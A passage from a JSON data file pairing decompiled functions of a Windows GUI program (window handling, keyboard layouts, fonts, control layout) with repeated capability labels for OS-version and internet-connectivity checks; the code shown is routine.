fcn.00419904();\n    *(*0x497c20 + 0x78) = in_EAX;\n    puStack72 = 0x442d33;\n    fcn.00444218();\n    puStack72 = 0x442d45;\n    fcn.0043b890();\n    uStack76 = 0x442ebf;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x442d5e;\n    puStack72 = &stack0xfffffffc;\n    fcn.00442b1c();\n    uStack88 = 0x442e1e;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar3 = fcn.00458568(0xb000, 0, 0);\n    sub.user32.dll_SendMessageA(uVar3);\n    in_EAX[0xa5] = 0;\n    do {\n        fcn.004465a8();\n        if (*(*0x497c1c + 0xa4) == '\\0') {\n            if (in_EAX[0xa5] != 0) {\n                fcn.00442a7c();\n            }\n        }\n        else {\n            in_EAX[0xa5] = 2;\n        }\n    } while (in_EAX[0xa5] == 0);\n    uVar3 = fcn.00458568(0xb001, 0, 0);\n    sub.user32.dll_SendMessageA();\n    fcn.00458568();\n    sub.user32.dll_GetActiveWindow();\n    *in_FS_OFFSET = uVar3;\n    fcn.00442b14(0x442e25);\n    return;\n}\n",
        "token_count": 1195
    },
    "00442f10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442f10(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00454658(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.0045461c();\n            if (((*(piVar3 + 0x51) & 0x80) != 0) && (*(piVar3 + 0x57) != '\\0')) {\n                (**(*piVar3 + 0x7c))();\n            }\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\n                fcn.00442f10(arg_8h);\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "00442f80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442f80(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (((*(in_EAX + 7) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        (**(*in_EAX + 0x7c))();\n        if ((in_EAX[0xa4] != 0) && (iVar1 = fcn.00436510(),  -1 < iVar1 + -1)) {\n            do {\n                piVar2 = fcn.00436520();\n                if (*(piVar2 + 0x3e) != '\\0') {\n                    (**(*piVar2 + 0x40))();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00442f10(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "00443058": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00443058(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00454658(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.0045461c();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.00443028(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004047dc(),  cVar1 != '\\0' && (cVar1 = fcn.00443058(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 234
    },
    "004430d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004430d4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.00443028(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.00443028(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.00443058(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00443158": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00443158(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00454658(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.0045461c();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.00443128(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004047dc(),  cVar1 != '\\0' && (cVar1 = fcn.00443158(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 234
    },
    "004431d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004431d4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.00443128(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.00443128(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.00443158(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00443228": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.00443228(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char var_5h;\n    uint var_4h;\n    \n    var_5h = '\\0';\n    iVar2 = fcn.00420584();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00420558();\n            cVar1 = fcn.004047dc();\n            if (cVar1 == '\\0') {\n                var_5h = fcn.00443228(arg_8h);\n                if (var_5h != '\\0') {\n                    return var_5h;\n                }\n            }\n            else {\n                cVar1 = fcn.0044a2e8();\n                if (cVar1 != '\\0') {\n                    return '\\x01';\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return var_5h;\n}\n",
        "token_count": 220
    },
    "004432a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.004432a4(void)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30a) != 0) {\n        (**(in_EAX + 0x308))();\n    }\n    if ((((*(in_EAX + 0x290) == 0) || (*(*(in_EAX + 0x290) + 0x38) == 0)) || (cVar1 = fcn.0040484c(),  cVar1 == '\\0'))\n       && (cVar1 = fcn.00443228(&stack0xfffffffc),  cVar1 == '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 192
    },
    "0044331c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044331c(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(arg_8h + 0x298) != 0) && (iVar1 = (****(arg_8h + 0x298))(*(arg_8h + 0x298), arg_ch, arg_10h),  iVar1 == 0)) {\n        return 0;\n    }\n    uVar2 = fcn.004206f0(arg_8h, arg_ch, arg_10h);\n    return uVar2;\n}\n",
        "token_count": 146
    },
    "004433a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004433a0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x490504 != NULL)) {\n        cVar1 = fcn.00458874();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.00458568(0xffffffec);\n            uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n            if ((*(in_EAX + 0x328) == '\\0') && (*(in_EAX + 0x350) == '\\0')) {\n                uVar2 = fcn.00458568(0xffffffec, uVar3 & 0xfff7ffff);\n                sub.user32.dll_SetWindowLongA(uVar2);\n                uVar2 = fcn.00458568(0, 0, 0x485);\n                sub.user32.dll_RedrawWindow(uVar2);\n            }\n            else {\n                if ((uVar3 & 0x80000) == 0) {\n                    uVar2 = fcn.00458568(0xffffffec, uVar3 | 0x80000);\n                    sub.user32.dll_SetWindowLongA(uVar2);\n                }\n                uVar2 = fcn.00458568(*(in_EAX + 0x354), *(in_EAX + 0x329), \n                                     *(*(in_EAX + 0x328) * 4 + 0x490598) | *(*(in_EAX + 0x350) * 4 + 0x4905a0));\n                (**0x490504)(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 400
    },
    "004434b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004434b4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 != *(in_EAX + 0x350)) {\n        *(in_EAX + 0x350) = param_2;\n        if (*(in_EAX + 0x350) != '\\0') {\n            iVar1 = fcn.00447dac();\n            if (*(iVar1 + 8) != '\\0') {\n                fcn.00447dac();\n                fcn.004480d0();\n            }\n        }\n        fcn.004433a0();\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "004434f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004434f4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x490504 != 0)) &&\n       ((*(in_EAX + 0x328) != '\\0' || (*(in_EAX + 0x350) != '\\0')))) {\n        *(param_2 + 8) = *(param_2 + 8) | 0x80000;\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "0044359c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0044359c(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    (**(*in_EAX + 0xf0))();\n    fcn.0043cbb0();\n    fcn.0043f228();\n    fcn.00457090();\n    fcn.0043f648();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = 0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 191
    },
    "00443ac8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00443ac8(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint uVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff44();\n    puVar2 = *0x492378;\n    (*0x492378)[1] = in_EAX;\n    *puVar2 = 0x443e6c;\n    puVar2 = *0x492384;\n    (*0x492384)[1] = in_EAX;\n    *puVar2 = 0x443e78;\n    fcn.00443e84();\n    uVar3 = sub.user32.dll_GetKeyboardLayout(0);\n    *(in_EAX + 0x3c) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x4c) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x50) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x54) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x58) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x7c) = uVar3;\n    uVar3 = sub.user32.dll_GetDC(0);\n    uVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0x5a);\n    *(in_EAX + 0x40) = uVar4;\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    uVar4 = 0;\n    (***0x492534)(0, 0, fcn.0043f534, *(in_EAX + 0x58));\n    uVar3 = fcn.004244a8();\n    *(in_EAX + 0x84) = uVar3;\n    uVar3 = fcn.004244a8();\n    *(in_EAX + 0x88) = uVar3;\n    uVar3 = fcn.004244a8();\n    *(in_EAX + 0x80) = uVar3;\n    fcn.004442b4();\n    iVar1 = *(in_EAX + 0x84);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x444184;\n    iVar1 = *(in_EAX + 0x88);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x444184;\n    iVar1 = *(in_EAX + 0x80);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x444184;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 767
    },
    "00443d98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443d98(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x68) != *(in_EAX + 0x74)) && (*(in_EAX + 0x74) = *(in_EAX + 0x68),  *(in_EAX + 0x9a) != 0)) {\n        (**(in_EAX + 0x98))();\n    }\n    if ((*(in_EAX + 100) != *(in_EAX + 0x70)) && (*(in_EAX + 0x70) = *(in_EAX + 100),  *(in_EAX + 0x92) != 0)) {\n        (**(in_EAX + 0x90))();\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00443e1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443e1c(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004199cc();\n    fcn.004199cc();\n    fcn.00447134();\n    if ((*(*(in_EAX + 0x50) + 8) == 0) && (*(*0x497c1c + 0x84) != 0)) {\n        fcn.00459c94();\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "00443f68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443f68(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack672;\n    uint uStack668;\n    uchar *puStack664;\n    uint uStack656;\n    uint uStack636;\n    uint uStack628;\n    uint uStack624;\n    uchar *puStack620;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_214h;\n    uint lpList;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint hKey;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack620 = &stack0xfffffffc;\n    uStack624 = 0x444113;\n    uStack628 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd8c;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x34) == 0) {\n        var_4h = in_EAX;\n        uVar3 = fcn.00404620();\n        *(var_4h + 0x34) = uVar3;\n        fcn.00405530();\n        uStack636 = 0x40;\n        iVar4 = sub.user32.dll_GetKeyboardLayoutList();\n        if (-1 < iVar4 + -1) {\n            var_14h = &fcn.00443f68::lpList;\n            var_10h = iVar4;\n            do {\n                cVar2 = fcn.0045d9b4();\n                if (cVar2 != '\\0') {\n                    uStack656 = 0x444020;\n                    uStack656 = fcn.0040af08(0);\n                    uStack636 = 0x80000002;\n                    puStack664 = 0x44402b;\n                    iVar4 = sub.advapi32.dll_RegOpenKeyExA_1();\n                    if (iVar4 == 0) {\n                        uStack668 = 0x4440cf;\n                        uStack672 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xfffffd60;\n                        var_8h = 0x100;\n                        uVar3 = hKey;\n                        puStack664 = &stack0xfffffffc;\n                        iVar4 = sub.advapi32.dll_RegQueryValueExA_1\n                                          (hKey, 0x44415c, 0, 0, &fcn.00443f68::var_214h, &fcn.00443f68::var_8h);\n                        if (iVar4 == 0) {\n                            fcn.004057a0();\n                            (**(**(var_4h + 0x34) + 0x3c))();\n                            if (*var_14h == *(var_4h + 0x3c)) {\n                                fcn.004057a0();\n                            }\n                        }\n                        *in_FS_OFFSET = uVar3;\n                        sub.advapi32.dll_RegCloseKey_1(hKey, 0x4440d6);\n                        return;\n                    }\n                }\n                var_14h = var_14h + 1;\n                var_10h = var_10h + -1;\n            } while (var_10h != 0);\n        }\n        *(*(var_4h + 0x34) + 0x25) = 0;\n        fcn.0041b5e0();\n        puVar1 = puStack620;\n    }\n    puStack620 = puVar1;\n    *in_FS_OFFSET = uStack636;\n    uStack628 = 0x44411a;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 842
    },
    "004442b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004442b4(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack464;\n    int32_t iStack424;\n    uint uStack420;\n    uchar *puStack416;\n    uint var_191h;\n    uint var_f1h;\n    uint var_b5h;\n    uint pvParam;\n    uint var_1h;\n    \n    puStack416 = &var_1h + 1;\n    var_1h._0_1_ = 0;\n    if (*0x497c1c != 0) {\n        var_1h._0_1_ = *(*0x497c1c + 0x88);\n    }\n    uStack420 = 0x4443fb;\n    iStack424 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack424;\n    puVar1 = &var_1h + 1;\n    if (*0x497c1c != 0) {\n        fcn.00446d0c();\n        puVar1 = puStack416;\n    }\n    puStack416 = puVar1;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x1f, 0x3c, &pvParam, 0);\n    if (iVar2 == 0) {\n        sub.gdi32.dll_GetStockObject(0xd);\n        fcn.004248f8();\n    }\n    else {\n        sub.gdi32.dll_CreateFontIndirectA(&pvParam);\n        fcn.004248f8();\n    }\n    var_191h = 0x154;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_191h, 0);\n    if (iVar2 == 0) {\n        fcn.004249dc();\n        puStack464 = 0xd;\n        sub.gdi32.dll_GetStockObject();\n        fcn.004248f8();\n    }\n    else {\n        puStack464 = &var_b5h;\n        sub.gdi32.dll_CreateFontIndirectA();\n        fcn.004248f8();\n        sub.gdi32.dll_CreateFontIndirectA(&var_f1h);\n        fcn.004248f8();\n    }\n    fcn.0042467c();\n    fcn.0042467c();\n    *in_FS_OFFSET = puStack464;\n    if (*0x497c1c != 0) {\n        fcn.00446d0c(0x444402);\n    }\n    return;\n}\n",
        "token_count": 590
    },
    "00444410": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444410(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x8c) = *(in_EAX + 0x8c) + -1;\n    if ((*(in_EAX + 0x8c) == 0) && ((*(in_EAX + 0x8e) & 0x10) != 0)) {\n        fcn.00444430();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "004444c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004444c0(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    char in_DL;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar3 = *(*(arg_8h + -4) + 8) - **(arg_8h + -4);\n    if ((iVar3 < 0) || (in_DL - 3U < 2)) {\n        iVar3 = in_EAX[0x12];\n    }\n    var_10h = *(*(arg_8h + -4) + 0xc) - *(*(arg_8h + -4) + 4);\n    if ((var_10h < 0) || (in_DL - 1U < 2)) {\n        var_10h = in_EAX[0x13];\n    }\n    if ((in_DL == '\\x01') && (*(in_EAX + 0x273) == '\\x02')) {\n        var_8h = fcn.0043df0c();\n        var_ch = fcn.0043df2c();\n        iVar3 = (***0x492428)(0x3d);\n    }\n    else {\n        var_8h = **(arg_8h + -4);\n        var_ch = *(*(arg_8h + -4) + 4);\n    }\n    if (in_DL == '\\x01') {\n        piVar1 = *(arg_8h + -4) + 4;\n        *piVar1 = *piVar1 + var_10h;\n    }\n    else if (in_DL == '\\x02') {\n        piVar1 = *(arg_8h + -4) + 0xc;\n        *piVar1 = *piVar1 - var_10h;\n        var_ch = *(*(arg_8h + -4) + 0xc);\n    }\n    else if (in_DL == '\\x03') {\n        **(arg_8h + -4) = **(arg_8h + -4) + iVar3;\n    }\n    else if (in_DL == '\\x04') {\n        piVar1 = *(arg_8h + -4) + 8;\n        *piVar1 = *piVar1 - iVar3;\n        var_8h = *(*(arg_8h + -4) + 8);\n    }\n    (**(*in_EAX + 0x88))(var_10h, iVar3);\n    if (*(in_EAX + 0x273) == '\\x02') {\n        iVar3 = iVar3 - var_8h;\n        var_10h = var_10h - var_ch;\n    }\n    iVar2 = in_EAX[0x12];\n    if ((iVar3 != iVar2) || (in_EAX[0x13] != var_10h)) {\n    // switch table (6 cases) at 0x444606\n        switch(in_DL) {\n        case '\\x01':\n            piVar1 = *(arg_8h + -4) + 4;\n            *piVar1 = *piVar1 - (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x02':\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x03':\n            **(arg_8h + -4) = **(arg_8h + -4) - (iVar3 - iVar2);\n            break;\n        case '\\x04':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            break;\n        case '\\x05':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n        }\n    }\n    return;\n}\n",
        "token_count": 988
    },
    "0044467c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0044467c(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    (**(**(arg_8h + -8) + 8))();\n    if ((((*(arg_8h + -0xc) != 0) && (*(*(arg_8h + -0xc) + 0x30) == 0)) && ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0))\n       && (((*(*(arg_8h + -0xc) + 0x57) != '\\0' && (*(*(arg_8h + -0xc) + 0x5b) == in_AL)) &&\n           (*(*(arg_8h + -0xc) + 0x273) != '\\x01')))) {\n        fcn.00419730();\n    }\n    iVar2 = fcn.00443d90();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00443d7c();\n            if (((*(iVar3 + 0x30) == 0) && (*(iVar3 + 0x5b) == in_AL)) &&\n               (((*(iVar3 + 0x1c) & 0x10) == 0 &&\n                (((*(iVar3 + 0x57) != '\\0' && (*(iVar3 + 0x273) != '\\x01')) && (iVar3 != *(arg_8h + -0xc))))))) {\n                for (iVar3 = 0; iVar3 < *(*(arg_8h + -8) + 8); iVar3 = iVar3 + 1) {\n                    fcn.00419888();\n                    cVar1 = fcn.00444438();\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00419904();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = *(*(arg_8h + -8) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = arg_8h;\n            fcn.00419888();\n            fcn.004444c0(iVar3);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 575
    },
    "004447cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
